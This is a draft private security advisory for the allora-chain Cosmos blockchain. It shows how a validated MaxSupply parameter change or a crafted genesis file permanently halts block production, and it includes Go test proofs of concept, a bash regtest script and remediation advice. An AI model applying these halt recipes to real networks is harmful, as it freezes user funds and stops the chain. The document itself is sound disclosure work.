# GitHub Security Advisory — submission draft #1 (MaxSupply chain halt)

Paste each block into the matching field at
https://github.com/allora-network/allora-chain/security/advisories/new

Companion report: `advisory-divzero-chain-halt.md`. Same root-cause class, different parameter,
different fix. File both.

---

## Title

```
MaxSupply parameter update that passes validation permanently halts the chain
```

---

## Description

```markdown
### Summary

`x/mint` validates `MaxSupply` on its own. Nothing compares it against `EcosystemTokensMinted` or the
ecosystem account balance, which are the values it gets subtracted from later.

A whitelist admin sends one `MsgUpdateParams`. Validation returns nil. The remaining ecosystem mint
supply is now negative, and the next block dies inside `BeginBlocker`.

There is no way to fix it from inside the chain. `BeginBlock` runs before transactions, so the block
never reaches the tx phase and a corrective `MsgUpdateParams` can never be included. The parameter is
committed state and survives restart. Every validator fails identically at the same height.
`allorad rollback` rewinds state but leaves blocks in place, so the offending transaction just runs
again.

This is not an admin-abuse issue. Validation tells the admin the value is fine.

### Details

#### The missing check

`validateMaxSupply` is the only gate on the parameter. `x/mint/types/params.go:150-163`:

```go
func validateMaxSupply(i interface{}) error {
	v, ok := i.(math.Int)
	if !ok {
		return fmt.Errorf("invalid parameter type: %T", i)
	}
	if v.IsNil() {
		return fmt.Errorf("max supply cannot be nil: %s", v)
	}
	if v.LTE(math.NewInt(0)) {
		return fmt.Errorf("max supply must be positive: %s", v)
	}

	return nil
}
```

Positive, non-nil, done. `Params.Validate()` (`params.go:82-132`) calls this plus a set of
range checks on the fractions and `validateTokenSupplyAddsTo100Percent`. None of it touches keeper
state, which is where the value it needs to be compared against lives.

#### What goes negative

`GetEcosystemMintSupplyRemaining`, `x/mint/keeper/emissions.go:265-278`:

```go
func (k Keeper) GetEcosystemMintSupplyRemaining(
	ctx context.Context,
	params types.Params,
) (math.Int, error) {
	ecosystemTokensAlreadyMinted, err := k.EcosystemTokensMinted.Get(ctx)
	if err != nil {
		return math.Int{}, err
	}
	ecosystemMaxSupply := math.LegacyNewDecFromInt(params.MaxSupply).
		MulTruncate(params.EcosystemTreasuryPercentOfTotalSupply).TruncateInt()
	return ecosystemMaxSupply.Sub(ecosystemTokensAlreadyMinted), nil
}
```

The left side comes from parameters, the right side from accumulated runtime state, and the
difference is returned unclamped. During normal operation the invariant holds, because the only
runtime caller of `AddEcosystemTokensMinted` (`abci.go:119`) passes a value already clamped at
`abci.go:99-108`. Lowering the cap is the one thing that can invert it.

#### How it gets committed

`IsWhitelistAdmin` (`msg_server.go:33`), then `Validate()` (`:41`), then `Params.Set` (`:77`).

The recalculation block at `:89-110` would catch this. It re-reads the new params and errors, and
since Cosmos message handlers are atomic that would revert the whole transaction. But it sits after
the write and only runs when `recalculate_target_emission` is true, which proto3 defaults to false.
That flag is the difference between a rejected transaction and a dead chain. PoC 2 below sends it
false and the transaction succeeds.

#### Where the block dies

| # | Location | Failure | When |
|---|---|---|---|
| A | `x/mint/module/abci.go:109` | `sdk.NewCoin` panics, `negative coin amount` | steady-state mint branch |
| B | `x/mint/keeper/emissions.go:376-386` | `ErrNegativeCirculatingSupply` | month boundary |
| C | `x/mint/keeper/emissions.go:237-245` via `abci.go:144` | `ErrNegativeTargetEmissionPerToken` | every block |

C is the one that matters and the easiest to miss. `GetEmissionInfo` runs at the end of every
`BeginBlocker`, unconditionally, after the `EmissionEnabled` early return. It has no `IsNegative()`
check of its own, since that guard only exists on the month-boundary path. C is what the regtest in
PoC 3 actually hits.

The ecosystem cap is not the only route in either. Since

```
circulatingSupply = MaxSupply − lockedVestingTokens − (ecosystemBalance + remaining)
```

(`emissions.go:147-148`), a chain that has minted nothing at all still halts if `MaxSupply` falls
below the ecosystem account's bank balance plus vesting locks. So the real gap is broader than the
`EcosystemTokensMinted` comparison I started from, which matters for the fix.

#### Why nothing catches it

`x/mint/module/module.go:175-184` logs the error and returns it, which I gather is deliberate from
PR #838. That is fine on its own, but it only covers sink B and C. Sink A is a panic, and in
cosmos-sdk v0.50.14 `baseapp`'s `recover()` wraps `runTx` only (`baseapp/baseapp.go:840`), never
`beginBlock`. The other `recover()` calls in baseapp guard Query, PrepareProposal, ProcessProposal,
ExtendVote and VerifyVoteExtension. None of them wrap the block lifecycle. This repo adds no
recovery either; `app/app.go`'s `FinalizeBlock` override is metrics and logging.

So both a returned error and a raw panic reach CometBFT v0.38.21's `finalizeCommit`, which panics,
and the top-level `receiveRoutine` recover logs `CONSENSUS FAILURE!!!` and calls `onExit`.

#### Why you can't recover

From the SDK's own `server/rollback.go:22-26`:

> Rollback overwrites a state at height n with the state at height n - 1. The application also rolls
> back to height n - 1. No blocks are removed, so upon restarting CometBFT the transactions in block
> n will be re-executed against the application.

The bad params commit at height H and the halt is at H+1, so rolling back to H-1 replays H and
re-poisons the state. `EmissionEnabled = false` would avoid the halt, since `abci.go:48-50` returns
before all three sinks, but setting it needs a transaction and there are no more blocks.

#### A second way in, with no admin key

`ValidateGenesis` (`x/mint/types/genesis.go:38-61`) checks `EcosystemTokensMinted.IsNegative()` and
nothing else. `allorad genesis validate-genesis` exits 0 and prints "is a valid genesis file" for a
genesis that produces zero blocks. `InitGenesis` (`x/mint/keeper/genesis.go:11`) then writes the
params with no check at all.

Worth noting that this state is reachable through normal operation, not just by hand-editing:
`ExportGenesis` (`keeper/genesis.go:44-80`) emits `ecosystem_tokens_minted` verbatim, so exporting a
live chain and lowering `max_supply` reproduces it with fully consistent bank state.

#### Why this looks like a gap rather than a design decision

The `<= 0` check in `validateMaxSupply` exists to stop a *different* `BeginBlocker` halt, the
`ErrZeroDenominator` at `emissions.go:221-229`. So `MaxSupply` already has a validator whose only job
is keeping `BeginBlocker` alive. It just misses this case.

`ValidateBlocksPerMonth` (`x/emissions/types/params.go:565-570`, enforced at `msg_server.go:80-83`)
is the same idea applied properly: reject the halting value at the message boundary so the bad state
never lands.

### PoC

Three reproductions, all additive files with no production code modified. Everything below was run
against `dev` @ `f5b08b87`. `v0.17.0` @ `ac7ae156` is byte-identical in every affected file.

---

#### PoC 1 — in-process, real keepers

`x/mint/module/poc_halt_test.go`:

```go
package mint_test

import (
	cosmosMath "cosmossdk.io/math"

	"github.com/allora-network/allora-chain/app/params"
	mint "github.com/allora-network/allora-chain/x/mint/module"

	sdk "github.com/cosmos/cosmos-sdk/types"
)

func (s *MintModuleTestSuite) TestPoC_UnrecoverableChainHaltViaMaxSupplyRegression() {
	// 1. Seed realistic mid-life minting state. Default cap is
	//    MaxSupply(1e27) * EcosystemPct(0.3595) = 3.595e26, so 1e26 is well inside it.
	alreadyMinted, ok := cosmosMath.NewIntFromString("100000000000000000000000000") // 1e26
	s.Require().True(ok)
	s.Require().NoError(s.mintKeeper.AddEcosystemTokensMinted(s.ctx, alreadyMinted))

	// 2. Lower MaxSupply to 2e26. New cap = 7.19e25, below the 1e26 already minted.
	mintParams, err := s.mintKeeper.Params.Get(s.ctx)
	s.Require().NoError(err)
	regressedMaxSupply, ok := cosmosMath.NewIntFromString("200000000000000000000000000") // 2e26
	s.Require().True(ok)
	mintParams.MaxSupply = regressedMaxSupply

	// 3. The missing constraint: Validate() accepts the chain-bricking value.
	s.Require().NoError(
		mintParams.Validate(),
		"VULN: Params.Validate() ACCEPTS a MaxSupply regression below already-minted supply",
	)

	// 4. Apply the params.
	s.Require().NoError(s.mintKeeper.Params.Set(s.ctx, mintParams))

	// 5. Steady state: emission exceeds the ecosystem balance, which is why the module
	//    mints at all. Balance is 0 here, so any positive emission enters the branch.
	s.Require().NoError(s.mintKeeper.PreviousBlockEmission.Set(s.ctx, cosmosMath.NewInt(1_000_000_000_000)))
	s.ctx = s.ctx.WithBlockHeight(2) // not a month boundary, so no recalc path

	p, err := s.mintKeeper.Params.Get(s.ctx)
	s.Require().NoError(err)
	remaining, err := s.mintKeeper.GetEcosystemMintSupplyRemaining(s.ctx, p)
	s.Require().NoError(err)
	s.Require().True(
		remaining.IsNegative(),
		"precondition: GetEcosystemMintSupplyRemaining must be negative, got %s", remaining.String(),
	)
	s.T().Logf("ecosystemMintSupplyRemaining (negative) = %s", remaining.String())

	// 6. The next block's BeginBlocker panics.
	s.Require().Panics(
		func() { _ = mint.BeginBlocker(s.ctx, s.mintKeeper) },
		"HARM: BeginBlocker must panic (negative coin amount) -> chain halt",
	)

	// 7. And every subsequent block too. No corrective tx can ever run.
	s.ctx = s.ctx.WithBlockHeight(3)
	s.Require().Panics(
		func() { _ = mint.BeginBlocker(s.ctx, s.mintKeeper) },
		"HARM: every subsequent BeginBlocker also panics -> permanent halt",
	)

	// Sanity: the negative remaining supply is what NewCoin rejects.
	s.Require().Panics(func() {
		_ = sdk.NewCoin(params.DefaultBondDenom, remaining)
	}, "the negative remaining supply is what NewCoin rejects with a panic")
}
```

Run:

```
go test ./x/mint/module/ -run 'TestMintModuleTestSuite/TestPoC_UnrecoverableChainHaltViaMaxSupplyRegression' -v
```

Output:

```
=== RUN   TestMintModuleTestSuite/TestPoC_UnrecoverableChainHaltViaMaxSupplyRegression
    poc_halt_test.go:80: ecosystemMintSupplyRemaining (negative) = -28100000000000000000000000
--- PASS: TestMintModuleTestSuite/TestPoC_UnrecoverableChainHaltViaMaxSupplyRegression (0.02s)
PASS
```

---

#### PoC 2 — through the real `MsgUpdateParams` handler

PoC 1 writes params with `Params.Set`, which skips the msg server. That leaves the obvious question
of whether the real message path has a guard. It does not.

`x/mint/module/poc_msgserver_halt_test.go`:

```go
package mint_test

import (
	cosmosMath "cosmossdk.io/math"

	mintkeeper "github.com/allora-network/allora-chain/x/mint/keeper"
	mint "github.com/allora-network/allora-chain/x/mint/module"
	"github.com/allora-network/allora-chain/x/mint/types"
)

func (s *MintModuleTestSuite) TestPoC_MsgServerCommitsHaltingParams() {
	// 1. A real whitelist admin.
	admin := s.addrsStr[0]
	s.Require().NoError(
		s.emissionsKeeper.GetWhitelistsKeeper().AddWhitelistAdmin(s.ctx, admin),
	)
	isAdmin, err := s.mintKeeper.IsWhitelistAdmin(s.ctx, admin)
	s.Require().NoError(err)
	s.Require().True(isAdmin, "precondition: sender must pass the IsWhitelistAdmin gate")

	// 2. Mid-life minting state: 1e26 minted, inside the default cap of 3.595e26.
	alreadyMinted, ok := cosmosMath.NewIntFromString("100000000000000000000000000")
	s.Require().True(ok)
	s.Require().NoError(s.mintKeeper.AddEcosystemTokensMinted(s.ctx, alreadyMinted))

	// 3. Lower MaxSupply so the cap (2e26 * 0.3595 = 7.19e25) drops below what is minted.
	params, err := s.mintKeeper.Params.Get(s.ctx)
	s.Require().NoError(err)
	regressedMaxSupply, ok := cosmosMath.NewIntFromString("200000000000000000000000000")
	s.Require().True(ok)
	params.MaxSupply = regressedMaxSupply

	blocksPerMonth, err := s.mintKeeper.GetParamsBlocksPerMonth(s.ctx)
	s.Require().NoError(err)

	// 4. Send it through the real handler.
	msgServer := mintkeeper.NewMsgServerImpl(s.mintKeeper)
	resp, err := msgServer.UpdateParams(s.ctx, &types.UpdateParamsRequest{
		Sender:                    admin,
		Params:                    params,
		RecalculateTargetEmission: false, // proto3 default
		BlocksPerMonth:            blocksPerMonth,
	})
	s.Require().NoError(err, "VULN: the real msg server accepts the chain-halting params")
	s.Require().NotNil(resp)
	s.T().Logf("UpdateParams returned err = <nil>")

	// 5. The bad value is committed, not rolled back.
	stored, err := s.mintKeeper.Params.Get(s.ctx)
	s.Require().NoError(err)
	s.Require().True(stored.MaxSupply.Equal(regressedMaxSupply))
	s.T().Logf("stored MaxSupply = %s", stored.MaxSupply.String())

	remaining, err := s.mintKeeper.GetEcosystemMintSupplyRemaining(s.ctx, stored)
	s.Require().NoError(err)
	s.Require().True(remaining.IsNegative())
	s.T().Logf("ecosystemMintSupplyRemaining = %s (negative=%v)",
		remaining.String(), remaining.IsNegative())

	// 6. And the next block dies.
	s.Require().NoError(
		s.mintKeeper.PreviousBlockEmission.Set(s.ctx, cosmosMath.NewInt(1_000_000_000_000)),
	)
	s.ctx = s.ctx.WithBlockHeight(2)
	s.Require().Panics(func() {
		_ = mint.BeginBlocker(s.ctx, s.mintKeeper)
	}, "HARM: BeginBlocker panics after a validated MsgUpdateParams")
}
```

Run:

```
go test ./x/mint/module/ -run 'TestMintModuleTestSuite/TestPoC_MsgServerCommitsHaltingParams' -v
```

Output:

```
=== RUN   TestMintModuleTestSuite/TestPoC_MsgServerCommitsHaltingParams
    poc_msgserver_halt_test.go:64: UpdateParams returned err = <nil>
    poc_msgserver_halt_test.go:73: stored MaxSupply = 200000000000000000000000000
    poc_msgserver_halt_test.go:78: ecosystemMintSupplyRemaining = -28100000000000000000000000 (negative=true)
--- PASS: TestMintModuleTestSuite/TestPoC_MsgServerCommitsHaltingParams (0.01s)
PASS
```

---

#### PoC 3 — real binary under CometBFT, with a control arm

The baseline arm is the point. Without it, "the node logged a panic" proves nothing, because a port
clash or any unrelated startup fault also logs a panic. The verdict here is the highest committed
height.

`poc_regtest_controlled.sh`:

```bash
#!/usr/bin/env bash
# Two arms that differ ONLY by three jq edits to .app_state.mint:
#   baseline = stock genesis       -> node should commit blocks normally
#   patched  = regressed MaxSupply -> node should never commit a block
#
# Usage:
#   make build
#   bash poc_regtest_controlled.sh baseline
#   bash poc_regtest_controlled.sh patched
#
# Requires: jq.

set -uo pipefail
cd "$(dirname "$0")"

ARM="${1:?usage: $0 baseline|patched}"
BIN="$(pwd)/build/allorad"
HOME_DIR="/tmp/allora-poc-$ARM"
LOG="/tmp/allora-poc-$ARM.log"
CHAIN_ID="regtest"

case "$ARM" in
  baseline) P1=26999; P2=26998; P3=26997 ;;
  patched)  P1=26989; P2=26988; P3=26987 ;;
  *) echo "arm must be 'baseline' or 'patched'"; exit 2 ;;
esac

rm -rf "$HOME_DIR" "$LOG"; mkdir -p "$HOME_DIR"

# Every init step's exit status is checked.
run() {
  echo "-- $*"
  "$@" >/dev/null 2>&1
  local rc=$?
  echo "   exit=$rc"
  [ $rc -eq 0 ] || { echo "!! init step failed, aborting"; exit 1; }
}

echo "### ARM=$ARM — init"
run "$BIN" --home "$HOME_DIR" config set client chain-id "$CHAIN_ID"
run "$BIN" --home "$HOME_DIR" config set client keyring-backend test
run "$BIN" --home "$HOME_DIR" init regtest --chain-id "$CHAIN_ID" --default-denom uallo
run "$BIN" --home "$HOME_DIR" keys add alice --keyring-backend test
run "$BIN" --home "$HOME_DIR" genesis add-genesis-account alice 1000000000000000000000000uallo --keyring-backend test
run "$BIN" --home "$HOME_DIR" genesis gentx alice 1000000000000000000000uallo --chain-id "$CHAIN_ID" --keyring-backend test
run "$BIN" --home "$HOME_DIR" genesis collect-gentxs

GEN="$HOME_DIR/config/genesis.json"

# The only difference between the two arms.
#   max_supply             1e27 -> 2e26   (new ecosystem cap 2e26 * 0.3595 = 7.19e25)
#   ecosystem_tokens_minted   0 -> 1e26   (already minted, now above the cap)
#   previous_block_emission   0 -> 1e12
if [ "$ARM" = "patched" ]; then
  tmp="$(mktemp)"
  jq '
    .app_state.mint.params.max_supply        = "200000000000000000000000000"
    | .app_state.mint.ecosystem_tokens_minted  = "100000000000000000000000000"
    | .app_state.mint.previous_block_emission  = "1000000000000"
  ' "$GEN" > "$tmp" && mv "$tmp" "$GEN"
fi

echo "### mint app_state:"
jq -c '.app_state.mint | {max_supply: .params.max_supply, ecosystem_tokens_minted, previous_block_emission}' "$GEN"

echo "### validate-genesis:"
"$BIN" --home "$HOME_DIR" genesis validate-genesis 2>&1 | tail -1
echo "   exit=${PIPESTATUS[0]}"

echo "### starting node (25s window)"
( "$BIN" --home "$HOME_DIR" start --minimum-gas-prices 0uallo --log_no_color \
    --rpc.laddr tcp://127.0.0.1:$P1 --p2p.laddr tcp://127.0.0.1:$P2 \
    --grpc.address 127.0.0.1:$P3 --grpc-web.enable=false --api.enable=false > "$LOG" 2>&1 ) &
PID=$!
sleep 25
kill "$PID" 2>/dev/null; wait "$PID" 2>/dev/null

echo
echo "=========== VERDICT ==========="
HEIGHT="$(grep -oE 'committed state.*height=[0-9]+' "$LOG" | grep -oE 'height=[0-9]+' | cut -d= -f2 | sort -n | tail -1)"
echo "highest committed height: ${HEIGHT:-NONE}"
if [ -z "$HEIGHT" ]; then
  echo "RESULT: node committed NO blocks"
else
  echo "RESULT: node committed up to height $HEIGHT"
fi
echo
echo "--- consensus failures ---"
grep -E "CONSENSUS FAILURE|proxyAppConn.FinalizeBlock|Mint BeginBlocker error" "$LOG" \
  | sed -E 's/ stack=.*//' | head -5
echo "==============================="
```

**Baseline arm:**

```
### mint app_state:
{"max_supply":"1000000000000000000000000000","ecosystem_tokens_minted":"0","previous_block_emission":"0"}
### validate-genesis:
File at /tmp/allora-poc-baseline/config/genesis.json is a valid genesis file
   exit=0

=========== VERDICT ===========
highest committed height: 4
RESULT: node committed up to height 4

--- consensus failures ---
===============================
```

**Patched arm:**

```
### mint app_state:
{"max_supply":"200000000000000000000000000","ecosystem_tokens_minted":"100000000000000000000000000","previous_block_emission":"1000000000000"}
### validate-genesis:
File at /tmp/allora-poc-patched/config/genesis.json is a valid genesis file
   exit=0

=========== VERDICT ===========
highest committed height: NONE
RESULT: node committed NO blocks

--- consensus failures ---
ERR Mint BeginBlocker error!  module=server
ERR error in proxyAppConn.FinalizeBlock err="could not recalculate target emission: target emission
  per token is negative: 0.605000000000000000 | -28100.000000000000000000 | -425.012500000000000000:
  negative target emission per token" module=state
ERR CONSENSUS FAILURE!!! err="failed to apply block; error could not recalculate target emission:
  target emission per token is negative: 0.605000000000000000 | -28100.000000000000000000 |
  -425.012500000000000000: negative target emission per token [x/mint/keeper/emissions.go:238]"
  module=consensus
```

The CometBFT stack in the patched log shows `finalizeCommit(0x…, 0x1)`, so the failure is at height
1. Same genesis passes `validate-genesis`, and the node never commits a block.

### Impact

The chain stops producing blocks and cannot be restarted from inside the chain.

Transfers, staking and unstaking, emissions, topic and worker and reputer operations, governance and
IBC all stop. Funds are frozen for the duration. Recovery means a coordinated binary patch and
restart across validators, because `BeginBlock` runs ahead of transaction delivery, the parameter is
committed state that survives restarts, and rollback replays the block that caused it.

The tooling gives no warning. `Params.Validate()` and `allorad genesis validate-genesis` both accept
the value. A command whose whole job is telling an operator that their genesis produces a working
chain exits 0 on one that produces zero blocks.

**On likelihood.** A few things make this more plausible than a fat-fingered number.
`MsgUpdateParams` replaces the entire struct, and the proto says so explicitly: "NOTE: All parameters
must be supplied." So `MaxSupply` is re-sent on every mint parameter change, including one only meant
to touch `EmissionEnabled` or `FEmission`. A stale baseline or a dropped digit is enough.
`validateTokenSupplyAddsTo100Percent` also forces the six allocation fractions to sum to exactly 1,
so any reallocation away from the ecosystem bucket lowers the cap as a side effect. And an operator
cannot easily check their work, because `EcosystemTokensMinted` has no query endpoint. You would have
to derive it as `MaxSupply × ecoPct − remaining`.

**On severity.** `SECURITY.md:54-61` rates chain halts CRITICAL, and that rubric is impact-only, with
no likelihood axis and no carve-out for privileged roles. To be straightforward about the other side:
the runtime path does require a whitelist admin, and a rubric that discounts trusted-role findings
would put this at High. I am submitting it as Critical because your own policy names this exact
impact; because the admin is doing something the validator approves rather than something obviously
destructive; because every other mint parameter mistake can be undone by a follow-up transaction and
this one cannot; and because the genesis path reaches the same dead chain with no whitelist and no
admin key involved. Happy to defer to your triage.

### Suggested remediation

The pattern already in the codebase for this is `ValidateBlocksPerMonth`: reject at the boundary and
leave the consensus path fail-closed.

1. **Check the invariant in `x/mint/keeper/msg_server.go` `UpdateParams`, before `Params.Set`**,
   where runtime state is available. `MaxSupply × EcosystemTreasuryPercentOfTotalSupply <
   EcosystemTokensMinted` covers the case I started from, but given the `circulatingSupply` path it
   is worth validating the fuller relation including `ecosystemBalance` and vesting locks. The same
   check belongs in `ValidateGenesis` (`x/mint/types/genesis.go`) and the migration path
   (`x/mint/migrations/v5/migrate.go:34`).

2. **Guard `tokensToMint.IsNegative()` before `sdk.NewCoin` at `abci.go:109`** and return a typed
   error. A panic in the consensus path is worse than an error return, so this is worth having as a
   backstop even with the boundary check in place.

3. **I would avoid clamping and continuing.** Clamping `GetEcosystemMintSupplyRemaining` at zero, or
   turning the `RecalculateTargetEmission` error into a clamp, undoes what PR #838 set out to do and
   lets the chain keep emitting against a `MaxSupply` below the tokens that already exist, quietly
   corrupting vesting and circulating-supply numbers. It also does not close the `abci.go:144` sink,
   since `circulatingSupply` goes negative through `ecosystemBalance` on its own.

4. Minor, but exposing `EcosystemTokensMinted` on the query server would let operators sanity-check a
   new `MaxSupply` before sending it.

### Related

While checking whether an admin already had simpler ways to halt the chain, I found a second
unrecoverable halt of the same class that the fix above does not close:
`validateValidatorsVsAlloraPercentReward` accepts `0`, which zeroes the `f_stakers` denominator in
`GetMaximumMonthlyEmissionPerUnitStakedToken` and panics with "division by zero" on the same
every-block path. Reported separately.
```

---

## Affected products

| Field | Value |
|---|---|
| **Ecosystem** | `Go` |
| **Package name** | `github.com/allora-network/allora-chain` |
| **Affected versions** | `<= 0.17.0` |
| **Patched versions** | *(leave blank, no patch yet)* |

Confirmed at `v0.17.0` (commit `ac7ae156`, 2026-07-07) and at `dev` tip (commit `f5b08b87`,
2026-07-27). All six files in the attack path are byte-identical between the two.

---

## Severity

**Pick `Critical`** from the dropdown, per `SECURITY.md:54-61`.

If the form wants a CVSS vector:

```
CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:N/I:N/A:H
```

That computes to **6.8 (Medium)**, which does not match Critical. The gap is real and worth knowing
before you paste it. `PR:H` is accurate, since the runtime path does need a whitelist admin, and it
alone costs about three points. CVSS 3.1 also has no way to express "the entire L1 is permanently
down and needs a coordinated patch to restart" — `A:H` is the top of the scale and reads the same as
one server being briefly unavailable. The genesis path needs no privileges at all, but it is an
operator footgun rather than a remote attack, so it does not justify `PR:N`.

Best move is to select `Critical` and omit the vector, letting `SECURITY.md` do the work as their own
published policy. Do not inflate the vector to force the score up. Triagers notice, and this report
does not need the help.

---

## Weaknesses (CWE)

| CWE | Title | Why |
|---|---|---|
| **CWE-1284** | Improper Validation of Specified Quantity in Input | Primary. `MaxSupply` is accepted without being validated against the quantities it is compared to. |
| **CWE-754** | Improper Check for Unusual or Exceptional Conditions | The negative result is never checked before use. |
| **CWE-248** | Uncaught Exception | The `sdk.NewCoin` panic in sink A is uncaught in the consensus path. |

`CWE-20` (Improper Input Validation) as a fallback if CWE-1284 does not come up in the search.

---

## Files referenced in this advisory

| File | Status |
|---|---|
| `x/mint/module/poc_halt_test.go` | PoC 1, passes |
| `x/mint/module/poc_msgserver_halt_test.go` | PoC 2, passes |
| `poc_regtest_controlled.sh` | PoC 3, both arms verified |

The older `poc_regtest_mint_halt.sh` is superseded by `poc_regtest_controlled.sh`. Don't submit the
old one: it silences every init command without checking exit status, has no baseline arm, and
decides the verdict by grepping the whole log for "panic", which would report a halt for any
unrelated startup crash.

---

## Before submitting

- [ ] Report privately. `SECURITY.md` says not to use public GitHub issues for vulnerabilities.
- [ ] Do not test against mainnet, public testnets, or Allora frontends. All three PoCs above are
      local only.
- [ ] They confirm receipt within 48 hours per their disclosure process.
- [ ] Keep it confidential until there is a patch. Allow extra time, this one needs a network upgrade.
- [ ] `SECURITY.md:65` says there is no formal bounty program. Discretionary, generally high or
      critical, KYC required.
- [ ] File the divide-by-zero halt separately using `advisory-divzero-chain-halt.md`. The fix above
      does not close it.
